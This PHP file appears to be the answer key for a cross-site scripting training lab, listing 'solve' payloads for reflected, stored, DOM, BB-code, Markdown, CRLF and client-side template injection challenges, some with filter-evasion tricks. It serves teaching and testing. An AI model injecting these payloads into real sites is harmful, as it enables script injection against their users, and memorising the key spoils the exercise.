<?php
$simplePayloads = [
    '<img src=x onerror=alert(1)>',
    '<script>alert(1);</script>',
];


function addSimplePayloads($arr) {
    global $simplePayloads;
    return array_merge($simplePayloads, $arr);
}

$context = [
    'reflected-simple' => [
        'name' => 'Reflected XSS',
        'solve' => addSimplePayloads([

        ])
    ],
    'reflected-bb' => [
        'name' => 'Reflected BB Codes XSS',
        'solve' => [
            '[img]http://google.com/"/onerror="alert(1)[/img]'
        ]
    ],
    'reflected-markdown' => [
        'name' => 'Reflected MarkDown XSS',
        'solve' => [
            '[Click Here!](javascript:alert%281%29)'
        ]
    ],
    'reflected-crlf' => [
        'name' => 'Reflected CRLF XSS',
        'solve' => [
            '%0D%0A%0D%0A<script>alert(1);</script>'
        ]
    ],
    'reflected-script' => [
        'name' => 'Reflected Script Variable Escape',
        'solve' => [
            '</script><script>alert(1)</script>'
        ]
    ],
    'stored-simple' => [
        'name' => 'Stored XSS',
        'solve' => addSimplePayloads([

        ])
    ],
    'stored-easy' => [
        'name' => 'Stored XSS (Easy)',
        'solve' => [
            '<svg onload=alert(1)>'
        ]
    ],
    'stored-medium' => [
        'name' => 'Stored XSS (Medium)',
        'solve' => [
            '<iframe/src=javascript:new/**/Function`alert\`1\``></iframe>'
        ]
    ],
    'stored-hard' => [
        'name' => 'Stored XSS (Hard)',
        'solve' => [
            '<video><source onerror=alert(1)>'
        ]
    ],
    'dom-simple' => [
        'name' => 'DOM Based XSS',
        'solve' => addSimplePayloads([

        ])
    ],
    'csti-simple' => [
        'name' => 'CSTI',
        'solve' => [
            '{{constructor.constructor(\'alert(1)\')()}}'
        ]
    ],
];
